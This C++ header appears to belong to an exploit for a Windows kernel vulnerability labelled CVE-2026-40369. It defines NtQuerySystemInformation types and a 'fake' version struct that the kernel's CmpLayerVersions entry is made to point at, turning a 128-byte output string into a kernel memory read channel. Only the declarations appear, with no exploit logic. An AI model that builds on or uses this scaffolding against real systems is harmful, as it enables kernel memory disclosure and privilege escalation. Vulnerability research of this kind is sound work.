#pragma once
#include <windows.h>
#include <iostream>
#include <winternl.h>
#include <WinBase.h>
#include <ntstatus.h>
#include "include/common/memtools.hpp"

#ifndef SystemProcessInformationExtension
#define SystemProcessInformationExtension 253
#endif

#ifndef SystemBuildVersionInformation
#define SystemBuildVersionInformation 222
#endif

namespace CVE_2026_40369
{

    typedef enum _SYSTEM_INFORMATION_CLASS {
        SystemModuleInformation = 11,
        SystemExtendedProcessInformation = 57
    } SYSTEM_INFORMATION_CLASS;

    typedef NTSTATUS(WINAPI* PNtQuerySystemInformation)(
        __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
        __inout PVOID SystemInformation,
        __in ULONG SystemInformationLength,
        __out_opt PULONG ReturnLength
        );

    typedef struct _SYSTEM_BUILD_VERSION_INFORMATION {
        USHORT LayerIndex;          // +0x00
        USHORT LayerVersionCount;   // +0x02
        ULONG  Field_04;            // +0x04
        ULONG  Field_08;            // +0x08
        ULONG  Field_0C;            // +0x0C
        ULONG  Field_10;            // +0x10
        CHAR   String1[128];        // +0x14
        CHAR   String2[128];        // +0x94
        CHAR   String3[128];        // +0x114
        CHAR   String4[128];        // +0x194
        CHAR   String5[26];         // +0x214
        CHAR   String6[16];         // +0x22E
        BYTE   Padding[2];          // +0x23E
        ULONG  Field_240;           // +0x240
    } SYSTEM_BUILD_VERSION_INFORMATION, * PSYSTEM_BUILD_VERSION_INFORMATION;

    // UNICODE_STRING layout on x64
    typedef struct _UNICODE_STRING64 {
        USHORT  Length;
        USHORT  MaximumLength;
        ULONG   Padding;
        ULONG64 Buffer;
    } UNICODE_STRING64;

    // Fake struct that CmpLayerVersions[idx] points to.
    // Only us1 at offset +0x10 is used (-> String1, 128-byte output).
    typedef struct _FAKE_VERSION_STRUCT {
        BYTE             header[0x10];  // +0x00: DWORD region (don't care)
        UNICODE_STRING64 us1;           // +0x10: String1 channel (128 bytes output)
        UNICODE_STRING64 us5;           // +0x20: zeroed (unused)
        UNICODE_STRING64 us6;           // +0x30: zeroed (unused)
        UNICODE_STRING64 us2;           // +0x40: zeroed (unused)
        UNICODE_STRING64 us3;           // +0x50: zeroed (unused)
        UNICODE_STRING64 us4;           // +0x60: zeroed (unused)
        BYTE             pad[0x320 - 0x70];
        ULONG            field_320;     // +0x320
    } FAKE_VERSION_STRUCT;

    // Output struct
    typedef struct _QUERY_OUTPUT {
        USHORT LayerIndex;
        USHORT LayerVersionCount;
        ULONG  Field_04;
        ULONG  Field_08;
        ULONG  Field_0C;
        ULONG  Field_10;
        BYTE   String1[128];       // +0x14
        BYTE   String2[128];       // +0x94
        BYTE   String3[128];       // +0x114
        BYTE   String4[128];       // +0x194
        BYTE   String5[26];        // +0x214
        BYTE   String6[16];        // +0x22E
        BYTE   Padding[2];
        ULONG  Field_240;
    } QUERY_OUTPUT;

} // namespace CVE_2026_40369